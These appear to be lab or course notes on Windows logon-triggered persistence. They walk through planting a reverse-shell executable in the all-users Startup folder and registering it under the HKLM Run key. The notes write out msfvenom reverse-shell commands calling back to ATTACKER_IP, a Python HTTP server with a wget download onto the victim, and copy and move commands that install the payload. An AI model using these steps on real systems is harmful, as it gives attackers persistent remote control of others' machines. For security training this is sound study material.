# Logon Triggered Persistence

* Some actions performed by a user might also be bound to executing specific payloads for persistence.
* Windows operating systems present several ways to link payloads with particular interactions.

### Startup folder

* Each user has a folder under `C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` where you can put executables to be run whenever the user logs in.
* If we want to force all users to run a payload while logging in, we can use the folder under `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` in the same way.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
```

* We will then copy our payload into the victim machine. You can spawn an `http.server` with `Python3` and use `wget` on the victim machine to pull your file:

```
python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 
```

```
Powershell
wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe
We then store the payload into the C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp folder to get a shell back for any user logging into the machine.

Command Prompt
C:\> copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```

* Now be sure to sign out of your session from the start menu (closing the RDP window is not enough as it leaves your session open):

### Run / RunOnce

* You can also force a user to execute a program on logon via the registry. Instead of delivering your payload into a specific directory, you can use the following registry entries to specify applications to run at logon:

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

* The registry entries under `HKCU` will only apply to the current user, and those under `HKLM` will apply to everyone. Any program specified under the `Run` keys will run every time the user logs on. Programs specified under the `RunOnce` keys will only be executed a single time.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe
```

* After transferring it to the victim machine, let's move it to C:\Windows:

```
move revshell.exe C:\Windows
```

Let's then create a `REG_EXPAND_SZ` registry entry under `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`. The entry's name can be anything you like, and the value will be the command we want to execute.

![](https://user-images.githubusercontent.com/75596877/181061126-ae241ccd-7767-4401-9964-960d5ec878c3.png)

* After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10-20 seconds).
